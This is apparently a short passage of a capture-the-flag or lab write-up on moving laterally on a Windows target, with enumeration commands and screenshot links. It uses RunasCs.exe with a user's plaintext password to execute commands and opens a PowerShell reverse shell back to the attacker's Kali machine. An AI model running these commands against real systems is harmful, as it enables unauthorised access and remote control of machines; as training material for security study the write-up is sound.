![](<attachments/Pasted image 20260110003852.png>)
there is a user `alaading`
![](<attachments/Pasted image 20260110003939.png>)
```powershell
net user alaading
```

now we’ll check which ports are open inside the Windows machine  
```powershell
netstat /nat
```
![](<attachments/Pasted image 20260110004214.png>)
we can see that internally the Windows machine has port 5585 open

with Chisel we could pull that port so we can reach it from our Kali and connect, but we’ll do it with `runascs`

...
we transfer it to our Windows victim as `RunasCS.exe`
![](<attachments/Pasted image 20260110004923.png>)
![](<attachments/Pasted image 20260110005003.png>)
![](<attachments/Pasted image 20260110005111.png>)
```powershell
.\RunasCs.exe alaading f8gQ8fynP44ek1m3 "cmd /c whoami /all"
```
we do have command execution as the user `alaading`; now we’ll get the reverse shell

```powershell
.\RunasCs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r <ip>:443 
```
![](<attachments/Pasted image 20260110010211.png>)
`RunasCs.exe` helps us send a reverse shell as that user `alaading` back to our Kali
![](<attachments/Pasted image 20260110010314.png>)
